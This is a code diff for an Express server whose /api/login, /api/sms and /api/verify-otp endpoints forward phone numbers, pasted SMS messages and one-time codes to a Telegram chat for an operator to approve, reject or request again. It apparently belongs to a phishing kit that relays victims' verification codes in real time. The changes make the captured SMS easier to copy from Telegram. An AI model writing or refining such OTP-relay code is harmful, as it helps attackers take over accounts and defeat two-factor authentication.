@@ -12,6 +12,7 @@
        * resend   → 'resend'
        * reminder → 'reminder'
    - Preserves original message body when editing on resolve
+   - SMS message wrapped in <pre><code> for Telegram copy button
    - No DB (in-memory Map, auto-cleaned)
    ============================================================ */
 
@@ -143,7 +144,7 @@ function buildKeyboard(step, sessionId) {
 }
 
 /* ============================================================
-   TELEGRAM — send message (returns structured result)
+   TELEGRAM — send message
    ============================================================ */
 async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -295,6 +296,8 @@ app.post('/api/login', async (req, res) => {
 
 /* ============================================================
    POST /api/sms
+   — SMS body wrapped in <pre><code> so Telegram shows
+     a copy button on tap (long-press still works too)
    ============================================================ */
 app.post('/api/sms', async (req, res) => {
   try {
@@ -314,14 +317,14 @@ app.post('/api/sms', async (req, res) => {
     const sessionId = makeSessionId();
     const reference = makeReference('SMS');
 
-    /* ✅ FIXED: Use <code> instead of <pre> — Telegram rejects <pre> with certain characters */
+    /* ✅ <pre><code> — monospace block + Telegram copy button on tap */
     const text =
       `📩 <b>Pasted SMS — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
-      `📝 <b>Message:</b>\n<code>${escapeHtml(sms)}</code>\n` +
+      `📝 <b>Message:</b>\n<pre><code>${escapeHtml(sms)}</code></pre>\n` +
       `⏳ Tap ✅ / ❌ / 🔁 / 🔔 below`;
 
     const result = await sendTelegramWithButtons(text, sessionId, 'sms');
@@ -338,7 +341,6 @@ app.post('/api/sms', async (req, res) => {
       telegramError: result.error
     });
 
-    /* ✅ FIXED: Return clear error to frontend if Telegram failed */
     if (!result.ok) {
       console.warn('⚠️ Telegram send failed for SMS, but session created. Frontend will poll.');
     }
@@ -352,6 +354,7 @@ app.post('/api/sms', async (req, res) => {
 
 /* ============================================================
    POST /api/verify-otp
+   — Linked SMS also wrapped in <pre><code>
    ============================================================ */
 app.post('/api/verify-otp', async (req, res) => {
   try {
@@ -371,7 +374,7 @@ app.post('/api/verify-otp', async (req, res) => {
     const sessionId = makeSessionId();
     const reference = makeReference('OTP');
 
-    /* ✅ FIXED: Use <code> instead of <pre> */
+    /* ✅ <pre><code> for the linked SMS — copy button on tap */
     const text =
       `🔢 <b>OTP Entered — Awaiting Approval</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
@@ -379,7 +382,7 @@ app.post('/api/verify-otp', async (req, res) => {
       `🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
-      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<code>${escapeHtml(sms.slice(0, 400))}</code>` : '') +
+      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre><code>${escapeHtml(sms.slice(0, 400))}</code></pre>` : '') +
       `\n⏳ Tap ✅ / ❌ / 🔁 below`;
 
     const result = await sendTelegramWithButtons(text, sessionId, 'otp');
